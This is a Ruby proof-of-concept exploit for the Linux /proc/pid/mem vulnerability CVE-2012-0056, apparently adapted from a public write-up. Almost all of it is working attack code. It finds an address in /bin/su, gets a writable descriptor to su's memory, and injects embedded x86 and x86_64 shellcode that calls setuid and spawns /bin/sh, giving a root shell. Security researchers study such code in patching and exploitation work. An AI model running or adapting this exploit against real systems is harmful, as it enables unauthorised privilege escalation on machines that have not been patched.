### simple poc for cve-2012-0056  by mak (co.mak.foo@gmail.com)
### based on zx2c4 write-up (http://blog.zx2c4.com/749)
### On Arch Linux writing in .plt make su crash so try someware alse
### hf

require 'socket'

$temp_sock = '/tmp/.foo_sock'

def get_nice_addr
  if File.read('/etc/issue') =~ /Arch Linux/
    addr =`objdump -d /bin/su | grep '<close_stream>:' | awk '{print $1}'`
  else
    addr = `objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'`
  end
  return  addr.to_i(16)
end

if ARGV.size == 1
  ppid = ARGV.shift.to_i
  fd = File.open("/proc/#{ppid}/mem",'wb')
  puts "[+] opened /proc/#{ppid}/mem @ #{fd.fileno}"
  UNIXSocket.new($temp_sock).send_io fd
  exit
end


File.unlink $temp_sock if File.exist? $temp_sock
serv = UNIXServer.new($temp_sock)


addr = get_nice_addr()
puts "[+] got nice addr  @ #{addr.to_s(16)}"

out = `/bin/su non-existing-user 2>&1`
off = out =~ /non-existing-user/
addr -= off+1

shell = "\x90" * 10
mach =`uname -m`
if mach =~ /i686/
  shell << "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xc0\x89\xc3\xb0\x2e\xcd"
  shell << "\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
  shell << "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
elsif mach =~ /x86_64/
  shell << "\x48\x31\xc0\x48\x89\xc7\xb0\x69\x0f\x05\x48\x31\xc0\x48\x89"
  shell << "\xc7\xb0\x6a\x0f\x05\x48\x31\xc0\x50\x48\x89\xc6\x48\x89\xc2"
  shell << "\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x48"
  shell << "\x31\xc0\xb0\x3b\x0f\x05"
else
  raise '[-] unsupported arch'
end

pid = fork {
  argv = [$0.dup,Process.ppid.to_s]
  exec('/usr/bin/ruby',*argv)
}


memfd = serv.accept.recv_io
puts "[+] obtained fd to /proc/#{Process.pid}/mem @ #{memfd.fileno}"

memfd.sysseek addr
puts "[+] seeking to #{addr.to_s(16)}"
$stderr.reopen memfd
exec('/bin/su '+shell)

